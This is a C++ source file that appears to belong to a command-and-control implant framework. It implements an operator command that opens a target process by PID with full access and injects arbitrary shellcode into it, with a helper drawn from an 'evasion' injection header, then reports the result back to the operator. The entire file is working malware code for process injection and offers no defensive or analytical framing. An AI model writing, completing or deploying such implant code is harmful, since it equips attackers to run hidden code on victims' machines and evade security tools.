#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_SHINJECT

using namespace stardust;
using namespace starburst;

#include <evasion/injection_techniques.h>

auto declfn starburst::cmd_shinject(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t pid = parser_int32( params );
    uint32_t sc_len = 0;
    auto sc_data = parser_bytes( params, &sc_len );

    if ( !sc_data || sc_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no shellcode provided" ) ) );
        return;
    }

    DBG_PRINT( inst, "cmd_shinject: pid=%u sc_len=%u\n", pid, sc_len );

    HANDLE h_proc = inst.kernel32.OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
    if ( !h_proc ) {
        char msg[80] = { 0 };
        str_copy( msg, symbol<char*>( const_cast<char*>( "OpenProcess failed for PID " ) ) );
        char num[16];
        int_to_str( num, pid, 10 );
        str_concat( msg, num );
        queue_response( inst, task_uuid, RESPONSE_ERROR, msg );
        return;
    }

    HANDLE h_thread = inject_shellcode( inst, h_proc, sc_data, sc_len );

    if ( !h_thread ) {
        inst.kernel32.CloseHandle( h_proc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "injection failed" ) ) );
        return;
    }

    inst.kernel32.CloseHandle( h_thread );
    inst.kernel32.CloseHandle( h_proc );

    char msg[80] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "injected " ) ) );
    char num[16];
    int_to_str( num, sc_len, 10 );
    str_concat( msg, num );
    str_concat( msg, symbol<char*>( const_cast<char*>( " bytes into PID " ) ) );
    int_to_str( num, pid, 10 );
    str_concat( msg, num );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
